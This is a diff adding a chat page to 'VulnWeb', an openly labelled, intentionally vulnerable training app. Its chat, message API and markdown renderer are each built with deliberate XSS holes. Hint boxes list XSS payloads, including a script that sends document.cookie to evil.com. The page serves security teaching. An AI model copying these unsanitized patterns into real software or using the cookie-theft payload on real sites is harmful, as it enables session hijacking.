@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulnWeb — Chat (XSS via Messages)</title>
+    <link rel="stylesheet" href="/src/css/style.css">
+</head>
+<body>
+    <div class="warning-banner">
+        ⚠️ INTENTIONALLY VULNERABLE APPLICATION — FOR EDUCATIONAL USE ONLY ⚠️
+    </div>
+
+    <nav class="navbar">
+        <a href="/src/index.html" class="brand">Vuln<span>Web</span></a>
+        <div class="nav-links">
+            <a href="/src/index.html">Home</a>
+            <a href="/src/api-tester.html">API Tester</a>
+            <a href="/src/dom-xss.html">DOM XSS</a>
+            <a href="/src/login-client.html">Client Login</a>
+            <a href="/src/chat.html">Chat</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="card">
+            <h2>VulnChat <span class="vuln-badge vuln-high">XSS + Injection</span></h2>
+            <p>A simulated chat room. Messages are rendered without sanitization.</p>
+
+            <div id="chat-window" class="chat-window">
+                <div class="chat-msg system-msg">
+                    <strong>System:</strong> Welcome to VulnChat! Type a message below.
+                </div>
+            </div>
+
+            <form id="chat-form" class="chat-form">
+                <input type="text" id="chat-username" placeholder="Username" value="guest" style="width:150px;">
+                <input type="text" id="chat-message" placeholder="Type a message..." style="flex:1;">
+                <button type="submit">Send</button>
+            </form>
+
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>Messages are rendered with innerHTML — no sanitization.
+
+Try sending:
+  &lt;img src=x onerror="alert('XSS in chat')"&gt;
+  &lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;
+  &lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;
+  &lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999"&gt;HACKED&lt;/div&gt;
+
+Username field is also injectable:
+  &lt;b onmouseover="alert('XSS')"&gt;hover me&lt;/b&gt;</pre>
+                </details>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Message API <span class="vuln-badge vuln-high">No Auth + XSS</span></h2>
+            <p>Send messages via the REST API. Messages appear in the chat above.</p>
+
+            <form id="api-msg-form">
+                <label>POST /api/v2/chat — JSON body:</label>
+                <textarea id="api-msg-body" rows="4" placeholder='{"username": "hacker", "message": "<img src=x onerror=alert(1)>"}'></textarea>
+                <button type="submit">Send via API</button>
+            </form>
+            <div id="api-msg-output" class="output-box"></div>
+
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>The API accepts arbitrary JSON and renders it in the chat.
+No authentication, no rate limiting, no input validation.
+
+curl -X POST /api/v2/chat \
+     -H "Content-Type: application/json" \
+     -d '{"username":"&lt;script&gt;alert(1)&lt;/script&gt;","message":"pwned"}'</pre>
+                </details>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Markdown Renderer <span class="vuln-badge vuln-high">XSS via Markdown</span></h2>
+            <p>A "safe" markdown renderer that converts user input to HTML.</p>
+            <form id="markdown-form">
+                <label>Enter Markdown:</label>
+                <textarea id="markdown-input" rows="5" placeholder="# Hello World
+**bold** and *italic*
+[Click me](https://example.com)"></textarea>
+                <button type="submit">Render</button>
+            </form>
+            <div id="markdown-output" class="output-box"></div>
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>The naive markdown parser doesn't sanitize HTML.
+Try mixing markdown with raw HTML:
+  # Title
+  &lt;img src=x onerror="alert('XSS')"&gt;
+
+Or abuse link syntax:
+  [Click](javascript:alert(document.cookie))</pre>
+                </details>
+            </div>
+        </div>
+    </div>
+
+    <footer>VulnWeb v2.0 — Chat Lab — Practice Responsibly</footer>
+
+    <script>
+        var chatWindow = document.getElementById('chat-window');
+
+        // ============================================================
+        // VULNERABILITY: Chat messages rendered via innerHTML
+        // ============================================================
+        function addChatMessage(username, message, type) {
+            var msgDiv = document.createElement('div');
+            msgDiv.className = 'chat-msg ' + (type || '');
+            // VULNERABLE: innerHTML with unsanitized user input
+            msgDiv.innerHTML = '<strong>' + username + ':</strong> ' + message;
+            chatWindow.appendChild(msgDiv);
+            chatWindow.scrollTop = chatWindow.scrollHeight;
+        }
+
+        // Simulate some initial messages
+        addChatMessage('Alice', 'Hey everyone! How\'s it going?');
+        addChatMessage('Bob', 'Just learned about XSS! Pretty scary stuff.');
+        addChatMessage('System', 'Remember: never trust user input!', 'system-msg');
+
+        document.getElementById('chat-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var user = document.getElementById('chat-username').value || 'anonymous';
+            var msg = document.getElementById('chat-message').value;
+            if (msg) {
+                // VULNERABLE: Both username and message are unsanitized
+                addChatMessage(user, msg);
+                document.getElementById('chat-message').value = '';
+
+                // Simulate bot response after 1s
+                setTimeout(function() {
+                    addChatMessage('Bot', 'Thanks for your message, ' + user + '!', 'bot-msg');
+                }, 1000);
+            }
+        });
+
+        // ============================================================
+        // VULNERABILITY: API message endpoint — no auth, no sanitization
+        // ============================================================
+        document.getElementById('api-msg-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var body = document.getElementById('api-msg-body').value;
+            try {
+                var data = JSON.parse(body);
+                // VULNERABLE: Directly rendering API input
+                addChatMessage(data.username || 'api-user', data.message || '');
+                document.getElementById('api-msg-output').innerHTML =
+                    '<p class="text-success">Message sent to chat!</p>';
+            } catch(err) {
+                document.getElementById('api-msg-output').innerHTML =
+                    '<p style="color:#e94560;">Invalid JSON: ' + err.message + '</p>';
+            }
+        });
+
+        // ============================================================
+        // VULNERABILITY: Naive Markdown parser — XSS via HTML injection
+        // ============================================================
+        function renderMarkdown(text) {
+            // VULNERABLE: Naive regex-based markdown that doesn't strip HTML
+            var html = text
+                // Headers
+                .replace(/^### (.+)$/gm, '<h4>$1</h4>')
+                .replace(/^## (.+)$/gm, '<h3>$1</h3>')
+                .replace(/^# (.+)$/gm, '<h2>$1</h2>')
+                // Bold & Italic
+                .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
+                .replace(/\*(.+?)\*/g, '<em>$1</em>')
+                // Links — VULNERABLE: allows javascript: protocol
+                .replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2" style="color:#45a0e9;">$1</a>')
+                // Code
+                .replace(/`(.+?)`/g, '<code>$1</code>')
+                // Line breaks
+                .replace(/\n/g, '<br>');
+
+            // VULNERABLE: Raw HTML passes through — no sanitization
+            return html;
+        }
+
+        document.getElementById('markdown-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var input = document.getElementById('markdown-input').value;
+            // VULNERABLE: rendered output placed via innerHTML
+            document.getElementById('markdown-output').innerHTML = renderMarkdown(input);
+        });
+    </script>
+</body>
+</html>
